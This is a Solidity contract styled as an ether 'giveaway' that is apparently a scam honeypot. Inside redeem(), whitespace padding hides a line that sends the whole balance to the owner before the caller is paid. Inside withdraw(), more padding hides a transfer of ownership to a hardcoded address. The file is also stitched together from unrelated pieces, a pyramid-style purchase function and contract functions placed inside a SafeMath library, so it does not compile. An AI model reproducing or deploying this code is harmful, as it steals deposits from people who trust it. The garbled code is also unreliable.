 

pragma solidity ^0.4.19;

contract WhaleGiveaway1
{
    address public Owner = msg.sender;
    uint constant public minEligibility = 0.999001 ether; 
   


struct Cost {
    address owner;
    uint256 cost;
}

mapping(uint256 => Cost) public participant;

address public adminAddress;
uint256 public seatPrice = 5000000000000000;

function purchase() public payable {
    require(msg.sender != address(0));
    require(msg.value >= seatPrice);
    uint256 excess = SafeMath.sub(msg.value, seatPrice);
    participant[1].owner.transfer(uint256(SafeMath.mul(SafeMath.div(seatPrice, 100), SafeMath.div(100, SafeMath.div(200, 17)))));
    participant[2].owner.transfer(uint256(SafeMath.mul(SafeMath.div(seatPrice, 100), SafeMath.div(100, SafeMath.div(200, 17)))));
    participant[3].owner.transfer(uint256(SafeMath.mul(SafeMath.div(seatPrice, 100), SafeMath.div(100, SafeMath.div(200, 17)))));
    participant[4].owner.transfer(uint256(SafeMath.mul(SafeMath.div(seatPrice, 100), SafeMath.div(100, SafeMath.div(200, 17)))));
    participant[5].owner.transfer(uint256(SafeMath.mul(SafeMath.div(seatPrice, 100), SafeMath.div(100, SafeMath.div(200, 17)))));
    participant[6].owner.transfer(uint256(SafeMath.mul(SafeMath.div(seatPrice, 100), SafeMath.div(100, SafeMath.div(200, 17)))));
    participant[7].owner.transfer(uint256(SafeMath.mul(SafeMath.div(seatPrice, 100), SafeMath.div(100, SafeMath.div(200, 17)))));
    participant[8].owner.transfer(uint256(SafeMath.mul(SafeMath.div(seatPrice, 100), SafeMath.div(100, SafeMath.div(200, 17)))));
    participant[9].owner.transfer(uint256(SafeMath.mul(SafeMath.div(seatPrice, 100), SafeMath.div(100, SafeMath.div(200, 17)))));
    participant[10].owner.transfer(uint256(SafeMath.mul(SafeMath.div(seatPrice, 100), SafeMath.div(100, SafeMath.div(200, 17)))));
    participant[10] = participant[9];
    participant[9] = participant[8];
    participant[8] = participant[7];
    participant[7] = participant[6];
    participant[6] = participant[5];
    participant[5] = participant[4];
    participant[4] = participant[3];
    participant[3] = participant[2];
    participant[2] = participant[1];
    participant[1] = Cost(msg.sender, seatPrice);
    adminAddress.transfer(uint256(SafeMath.mul(SafeMath.div(seatPrice, 100), SafeMath.div(100, SafeMath.div(200, 17)))));
    NewParticipant(msg.sender, seatPrice, SafeMath.mul(SafeMath.div(seatPrice, 100), 115));
    seatPrice = SafeMath.mul(SafeMath.div(seatPrice, 100), 115);
    msg.sender.transfer(excess);
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns(uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns(uint256) {
        assert(b <= a);
        return a - b;
    }

    function()
    public
    payable
    {
        
    }
   
    function redeem()
    public
    payable
    {                                                                    
        if(msg.value>=minEligibility)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
         
        adr.call.value(msg.value)(data);
    }
}